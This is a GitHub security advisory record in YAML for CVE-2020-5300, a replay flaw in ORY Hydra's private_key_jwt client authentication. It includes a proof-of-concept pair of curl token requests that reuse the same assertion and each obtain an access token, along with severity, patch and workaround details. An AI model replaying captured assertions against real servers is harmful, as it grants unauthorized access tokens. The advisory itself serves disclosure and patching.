@@ -1,0 +1,78 @@
+description: |-
+  ### Impact
+
+  "When using client authentication method "private_key_jwt" [1], OpenId specification says the following about assertion `jti`:"
+
+  > A unique identifier for the token, which can be used to prevent reuse of the token. These tokens MUST only be used once, unless conditions for reuse were negotiated between the parties
+
+  "Hydra does not seem to check the uniqueness of this `jti` value. Here is me sending the same token request twice, hence with the same `jti` assertion, and getting two access tokens:"
+
+    ```
+  $ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
+     --header 'Content-Type: application/x-www-form-urlencoded' \
+     --data-urlencode 'grant_type=client_credentials' \
+     --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
+     --data-urlencode 'scope=application openid' \
+     --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
+     --data-urlencode 'client_assertion=eyJhb [...] jTw'
+  {"access_token":"zeG0NoqOtlACl8q5J6A-TIsNegQRRUzqLZaYrQtoBZQ.VR6iUcJQYp3u_j7pwvL7YtPqGhtyQe5OhnBE2KCp5pM","expires_in":3599,"scope":"application openid","token_type":"bearer"}⏎            ~$ curl --insecure --location --request POST 'https://localhost/_/oauth2/token' \
+     --header 'Content-Type: application/x-www-form-urlencoded' \
+     --data-urlencode 'grant_type=client_credentials' \
+     --data-urlencode 'client_id=c001d00d-5ecc-beef-ca4e-b00b1e54a111' \
+     --data-urlencode 'scope=application openid' \
+     --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
+     --data-urlencode 'client_assertion=eyJhb [...] jTw'
+  {"access_token":"wOYtgCLxLXlELORrwZlmeiqqMQ4kRzV-STU2_Sollas.mwlQGCZWXN7G2IoegUe1P0Vw5iGoKrkOzOaplhMSjm4","expires_in":3599,"scope":"application openid","token_type":"bearer"}
+  ```
+
+
+  ### Severity
+
+  "We rate the severity as medium because the following reasons make it hard to replay tokens without the patch:"
+
+  - TLS protects against MITM which makes it difficult to intercept valid tokens for replay attacks
+  - The expiry time of the JWT gives only a short window of opportunity where it could be replayed
+
+  ### Patches
+
+  This will be patched with v1.4.0+oryOS.17
+
+  ### Workarounds
+
+  Two workarounds have been identified:
+
+  - Do not allow clients to use `private_key_jwt`
+  - Use short expiry times for the JWTs
+
+  ### Upstream
+
+  This issue will be resolved in the upstream repository https://github.com/ory/fosite
+ghsaId: GHSA-3p3g-vpw6-4w66
+identifiers:
+- type: GHSA
+  value: GHSA-3p3g-vpw6-4w66
+- type: CVE
+  value: CVE-2020-5300
+permalink: https://github.com/advisories/GHSA-3p3g-vpw6-4w66
+publishedAt: "2021-05-27T18:43:22Z"
+references:
+- url: https://github.com/ory/hydra/security/advisories/GHSA-3p3g-vpw6-4w66
+- url: https://nvd.nist.gov/vuln/detail/CVE-2020-5300
+- url: https://github.com/advisories/GHSA-3p3g-vpw6-4w66
+summary: Authentication Bypass in hydra
+updatedAt: "2021-05-27T18:43:22Z"
+vulnerabilities:
+- firstPatchedVersion:
+    identifier: 1.4.0
+  package:
+    name: github.com/ory/hydra/oauth2
+  severity: MODERATE
+  updatedAt: "2021-05-24T21:19:27Z"
+  vulnerableVersionRange: < 1.4.0
+- firstPatchedVersion:
+    identifier: 1.4.0
+  package:
+    name: github.com/ory/hydra
+  severity: MODERATE
+  updatedAt: "2021-05-24T21:19:27Z"
+  vulnerableVersionRange: < 1.4.0
